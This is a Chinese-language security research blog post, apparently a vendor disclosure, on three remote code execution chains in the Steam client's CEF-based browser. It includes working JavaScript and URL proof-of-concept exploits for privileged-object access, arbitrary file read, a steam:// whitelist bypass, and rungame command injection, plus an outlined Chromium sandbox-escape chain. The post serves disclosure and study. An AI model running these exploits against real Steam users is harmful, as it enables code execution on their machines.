class=anchor aria-hidden=true href=#前言>#</a></h2><p>Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。</p><h2 id=rce1steamwebhelper中多个问题导致rce>RCE#1：<code>steamwebhelper</code>中多个问题导致RCE<a hidden class=anchor aria-hidden=true href=#rce1steamwebhelper中多个问题导致rce>#</a></h2><p><code>steamwebhelper</code>是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。</p><h3 id=在外部页面中获取steamclient对象>在外部页面中获取<code>SteamClient</code>对象<a hidden class=anchor aria-hidden=true href=#在外部页面中获取steamclient对象>#</a></h3><p><code>steamwebhelper</code>在加载一些特定的页面，例如<code>steampowered.com</code> 、 <code>steamloopback.host</code>等页面时，会在JavaScript运行环境中加入一个<strong>特权对象</strong><code>SteamClient</code>。对该过程进行逆向后，我们发现，对有域名的url，<code>steamwebhelper</code>会调用<code>BIsTrustedDomain</code>检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为<code>data</code>或<code>about</code>协议。</p><img src=assets/1.jpg style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>在外部页面中打开白名单中的域名会被同源策略限制，然而打开<code>about:blank</code>等页面并不会，因此我们可以在自己可控的页面中打开"about:blank"，获取并使用其<code>SteamClient</code>。</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>ab_page</span> <span class=o>=</span> <span class=nx>open</span><span class=p>(</span><span class=s2>&#34;about:blank&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>s_client</span> <span class=o>=</span> <span class=nx>ab_page</span><span class=p>.</span><span class=nx>SteamClient</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>s_client</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=使用browserview加载file协议>使用<code>BrowserView</code>加载file协议<a hidden class=anchor aria-hidden=true href=#使用browserview加载file协议>#</a></h3><p><code>SteamClient</code>是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。</p><img src=assets/2.png style=display:block;margin-left:auto;margin-right:auto;zoom:100%><p>通过<code>SteamClient.BrowserView</code>，我们可以创建并管理<code>BrowserView</code>。经过测试发现，<code>BrowserView</code>是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。</p><img src=assets/3.png style=display:block;margin-left:auto;margin-right:auto;zoom:100%><p>在测试<code>BrowserView</code>的功能时，我们发现<code>BrowserView.LoadURL</code>调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括<code>chrome://</code>、<code>file://</code>等权限较高的协议。</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b_view</span> <span class=o>=</span> <span class=nx>s_client</span><span class=p>.</span><span class=nx>BrowserView</span><span class=p>.</span><span class=nx>Create</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>LoadURL</span><span class=p>(</span><span class=s2>&#34;file:///etc/passwd&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>SetBounds</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>SetVisible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=获取browserview中加载的页面内容实现任意文件读>获取<code>BrowserView</code>中加载的页面内容，实现任意文件读<a hidden class=anchor aria-hidden=true href=#获取browserview中加载的页面内容实现任意文件读>#</a></h3><p>至此我们已可以通过<code>LoadURL</code>加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向<code>BrowserView</code>对象，发现其提供了<code>FindInPage</code>功能可以在页面中搜索特定字符串，并且通过调用<code>BrowserView.on("find-in-page-results", callback)</code>可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）</p><p>答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。</p><p>PoC（通过读<code>file:///home/</code>获取用户名）:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>is_str_in_bv</span><span class=p>(</span><span class=nx>bv</span><span class=p>,</span> <span class=nx>s</span><span class=p>,</span> <span class=nx>count</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>bv</span><span class=p>.</span><span class=nx>FindInPage</span><span class=p>(</span><span class=nx>s</span><span class=p>,</span> <span class=kc>true</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span> <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>&gt;</span> <span class=nx>count</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>b_view</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;find-in-page-results&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>b</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>a</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nx>b</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span> <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=nb>window</span><span class=p>.</span><span class=nx>stage</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>stage</span><span class=o>++</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=nb>window</span><span class=p>.</span><span class=nx>count</span> <span class=o>=</span> <span class=nx>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>baseuser</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>charset</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=kc>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>found</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nx>c</span> <span class=k>of</span> <span class=nx>charset</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>teststr</span> <span class=o>=</span> <span class=nx>c</span> <span class=o>+</span> <span class=nx>baseuser</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=s2>&#34;home/&#34;</span><span class=p>.</span><span class=nx>endsWith</span><span class=p>(</span><span class=nx>teststr</span><span class=p>))</span> <span class=nx>count</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=kr>await</span> <span class=nx>is_str_in_bv</span><span class=p>(</span><span class=nx>b_view</span><span class=p>,</span> <span class=nx>teststr</span><span class=p>,</span> <span class=nx>count</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>found</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>found</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>baseuser</span> <span class=o>=</span> <span class=nx>teststr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>baseuser</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=从任意文件读到任意文件创建>从任意文件读到任意文件创建<a hidden class=anchor aria-hidden=true href=#从任意文件读到任意文件创建>#</a></h3><p>在这篇<a href=https://hackerone.com/reports/667242>漏洞报告</a>中提到了，通过<code>steam://devkit-1</code>中的<code>list-shortcuts</code>等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在<code>~/.steam/steam.token</code>文件中随机生成一个字符串，在使用<code>steam://devkit-1</code>相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。</p><p>此时，我们正好可以用任意文件读获取到token的内容，从而使用该功能创建任意文件。</p><p>然而设想很美好，从<code>steamwebhelper</code>中打开<code>steam://</code>url时会有检查，只有在白名单中的功能可以直接从内置浏览器中打开，而<code>devkit-1</code>并不在其中。</p><img src=assets/4.jpg style=display:block;margin-left:auto;margin-right:auto;zoom:80%><p>经过我们的研究发现，白名单中的<code>steam://openexternalforpid/</code>会解析其内部的url并加载，通过打开<code>steam://openexternalforpid/1/steam://devkit-1/</code>即可绕过白名单的检查，从而实现任意文件创建。</p><p>PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;steam://openexternalforpid/1/steam://devkit-1/&#34;</span> <span class=o>+</span> <span class=nx>token</span> <span class=o>+</span> <span class=s2>&#34;/list-shortcuts?response=/tmp/hacked&#34;</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=任意文件创建到rce>任意文件创建到RCE<a hidden class=anchor aria-hidden=true href=#任意文件创建到rce>#</a></h3><p>在众多<code>steam://</code>url提供的功能中，<code>steam://AddNonSteamGame</code>看起来很有趣。顾名思义，它可以将用户提供的字符串作为一个非Steam游戏添加到Steam的游戏库中。Steam客户端会将非Steam游戏当作shell脚本执行，因此，我们可以在字符串中加入反引号来创建一个可以执行任意命令的游戏。想要使用这个功能，需要先创建<code>/tmp/addnonsteamgamefile</code>文件，Steam客户端会检查该文件是否存在，并尝试从中读取gameid。如果它读取到的gameid无效，就会随机生成一个，也就是说，文件里的内容并不影响功能。</p><p>巧合的是，我们此前的任意文件创建恰好可以满足此需求，从而能够添加任意自定义的游戏。</p><p>在尝试触发时，我们发现<code>steam://openexternalforpid</code>会将要打开的url中的域名转换为小写，即<code>steam://openexternalforpid/1/steam://AddNonSteamGame/</code>会变为<code>steam://addnonsteamgame/</code>，这样会导致该功能无法被Steam正确识别。</p><img src=assets/5.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>经常尝试，我们发现可以通过再加一层<code>steam://open</code>来bypass：</p><img src=assets/6.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>此时我们终于可以任意创建恶意游戏，但是打开游戏需要知道游戏的gameid，而我们并不知道这个随机生成的64位数字。这对于已经拥有任意文件读能力的我们并不是个大问题，我们通过读取<code>~/.local/share/Steam/logs/console_log.txt</code>，可以找到新创建出的恶意游戏的App id。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span> <span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=nx>ExecuteSteamURL</span><span class=p>:</span> <span class=s>&#34;steam://open/steam://AddNonSteamGame/%60gnome-calculator%60&#34;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span> <span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=nx>ExecuteSteamURL</span><span class=p>:</span> <span class=s>&#34;steam://AddNonSteamGame/%60gnome-calculator%60&#34;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span> <span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=nx>GLibLog</span><span class=p>:</span> <span class=nx>domain</span><span class=p>:</span><span class=nx>Gtk</span>  <span class=nx>msg</span><span class=p>:</span><span class=nf>gtk_disable_setlocale</span><span class=p>()</span> <span class=nx>must</span> <span class=nx>be</span> <span class=nx>called</span> <span class=nx>before</span> <span class=nf>gtk_init</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span> <span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=nx>sanitize</span> <span class=nx>shortcut</span> <span class=nx>app</span> <span class=nx>id</span> <span class=s>&#34;`gnome-calculator`&#34;</span><span class=p>:</span> <span class=nx>replacing</span> <span class=mi>0</span> <span class=nx>with</span> <span class=mi>3843969204</span><span class=p>,</span> <span class=nx>reason</span><span class=p>:</span> <span class=nx>k_unAppIdInvalid</span>
</span></span></code></pre></div><p>最终的gameid可由log中的App id计算得来，计算方法为：<code>app_id &lt;&lt; 32 | 0x2000000</code>。在知道了gameid之后，就可以使用<code>steam://rungameid</code>来启动它。</p><img src=assets/7.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>完整的利用代码我们已公开在我们的<a href=https://github.com/DarkNavySecurity/PoC/tree/main/steam-2260570>GitHub</a>。</p><h2 id=rce2steamrungame命令注入>RCE#2：<code>steam://rungame</code>命令注入<a hidden class=anchor aria-hidden=true href=#rce2steamrungame命令注入>#</a></h2><p><code>steam://rungame</code>是Steam提供的一个url scheme功能可以用于启动游戏并指定其命令行参数，在Linux客户端中打开会执行如下命令：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/sh -c /home/bob/.local/share/Steam/ubuntu12_32/reaper SteamLaunch <span class=nv>AppId</span><span class=o>={</span>appid<span class=o>}</span> -- /home/bob/.local/share/Steam/ubuntu12_32/steam-launch-wrapper -- <span class=o>{</span>gamepath<span class=o>}</span> <span class=o>{</span>argument<span class=o>}</span>
</span></span></code></pre></div><p>由于是<code>/bin/sh -c</code>执行的，存在命令注入的可能，尝试在命令行参数中加入<code>`ls`</code>，发现会变成<code>'`ls`'</code>，由于反引号被单引号包裹，无法直接命令注入。</p><p>接着尝试在命令行参数中加入单引号来破坏单引号的配对，却发现单引号直接消失了。</p><p>于是我们对<code>steam://rungame</code>的逻辑进行了简单的逆向分析，发现其步骤大致如下：</p><ol><li>调用<code>V_ParseShellCommandLine</code>，直接出现的<code>'</code>会被过滤，而<code>\'</code>会被替换成<code>'</code></li><li>调用<code>V_EscapeShellArgumentAndAppend</code>在参数两侧加上单引号，并将参数中的<code>'</code>替换成<code>'\''</code></li><li>将<code>\</code>替换成<code>\\</code></li><li>将其拼接进命令字符串执行</li></ol><p>可以看出，第三步中所有的<code>\</code>被当成了普通字符，为了<code>/bin/sh</code>能正常处理，添加了一个<code>\</code>用于转义，却没有考虑到<code>\</code>本身就是转义字符的可能性，如果我们将输入设置为<code>\'`gnome-calculator`\'</code>，在经历上述四步后会变成：<code>''\\''`gnome-calculator`'\\'''</code>，可以看出，将<code>\</code>替换成<code>\\</code>破坏了单引号配对的正确性，导致<code>`gnome-calculator`</code>出现在单引号之外，产生了命令注入的问题。</p><p>最后，为了生成能被<code>steam://rungame</code>正确处理的url，需要将<code>\</code>进行url编码，最终的PoC：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;steam://rungame/262410/76561202255233023/%5c&#39;`gnome-calculator`%5c&#39;&#34;</span><span class=p>&gt;</span>POPUP gnome-calculator<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>此PoC中的262410是《枪支世界：枪械拆解》的App id，可以将其替换成任意已安装的会解析命令行参数的游戏（大部分游戏均支持）。</p><h2 id=rce3chrome历史漏洞>RCE#3：Chrome历史漏洞<a hidden class=anchor aria-hidden=true href=#rce3chrome历史漏洞>#</a></h2><p>Steam内置的浏览器是基于 <code>Chromium Embedded Framework</code>(CEF)的 <code>85.0.4183.121</code>版本开发的，CEF是一个用来把Chromium嵌入应用的框架，与Chromium的版本号同步，而Chromium <code>85.0.4183.121</code>版本于2020年9月发布，到如今已经有了数不胜数的历史漏洞，而这些漏洞Steam几乎全未修复。</p><p>我们选取了一个v8漏洞(<a href=https://crbug.com/1234764>Issue 1234764</a>)以及一个用于沙箱逃逸的漏洞(<a href=https://crbug.com/1251727>Issue 1251727</a>)来完成RCE。</p><p>前者是一个循环右移优化错误，可以做到renderer进程的任意地址读写，其利用细节在漏洞报告的附件中已介绍得十分详细，在此不再赘述。</p><p>后者是一个逻辑漏洞，通过Mojo调用<code>CreateChildFrame</code>创建的<code>kPortal</code>和<code>kFencedframe</code>两种类型的<code>frame</code>，状态永远都不会变成<code>kCreated</code>，导致其析构的时候不会调用<code>WebContentsObserver::RenderFrameDeleted</code>通知析构存有<code>RenderFrameHostImpl</code>裸指针的对象，从而构成UAF。该漏洞的品相非常好，free和use都可以主动在任意时刻触发，且后续可以使用任意RFH下的Mojo接口来利用。然而由于漏洞报告中的原始PoC采用的是源码patch的方式来触发漏洞，若想达到此效果，需要patch binary添加shellcode来发送Mojo消息。</p><p>在实际编写exploit的过程中，为了减少工作量，我们想尽量少地patch binary，尽量使用JavaScript来编写exploit，但发现<code>kPortal</code>类型的frame无法加载指定src加载HTML，因此也就不能执行JavaScript。一个选择是通过patch来调用<code>RenderFrameImpl::ExecuteJavaScript</code>函数执行JavaScript，并在后续使用Tim Becker在<a href=https://blog.theori.io/cleanly-escaping-the-chrome-sandbox-1c38abd3c9cb>Cleanly Escaping the Chrome Sandbox</a>中提到的通用解决思路：将Mojo的handle从portal frame中发送给主frame来进行利用。</p><p>然而此方法仍然需要patch，在此我们提出一个新的利用方法，在有renderer任意读写的情况下，可以不需要patch来让不能执行JavaScript的portal frame发送Mojo消息。</p><p>经过我们的研究发现，发送Mojo消息时，实际的路由及处理由<code>mojo::Remote</code>的字段<code>internal_state_.proxy_</code>负责，我们可以利用v8漏洞从<code>g_frame_map</code>中读取到portal的<code>RenderFrameImpl</code>地址，将其发送消息的成员<code>proxy_</code>”偷“给另一个我们所控制的iframe，从而可以用该iframe伪装成portal使用JavaScript发送Mojo消息。</p><img src=assets/8.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>整体的利用思路如下：</p><ol><li><p>利用v8漏洞开启mojo js</p></li><li><p>创建一个iframe A，并使用v8漏洞劫持其虚表修改<code>OwnerType</code>，伪装成portal frame</p></li><li><p>创建一个iframe B,用于后续执行JavaScript</p></li><li><p>利用v8漏洞在<code>g_frame_map</code>中读取A和B的<code>RenderFrameImpl</code>地址</p></li><li><p>利用v8漏洞将A的<code>proxy_</code>赋值给B</p></li><li><p>使用B创建Mojo连接</p></li><li><p>移除A，析构<code>RenderFrameHostImpl</code></p></li><li><p>使用B触发UAF</p></li><li><p>使用Blob来占位、控虚表等后续利用</p></li></ol></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><span class=title>« 上一页</span><br><span>CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes</span>
</a><a class=next href=https://www.darknavy.org/zh/blog/strengthening_the_shield_mte_in_memory_allocators/><span class=title>下一页 »</span><br><span>填补盾牌的裂缝：堆分配器中的MTE</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://www.darknavy.org/zh/>DARKNAVY</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>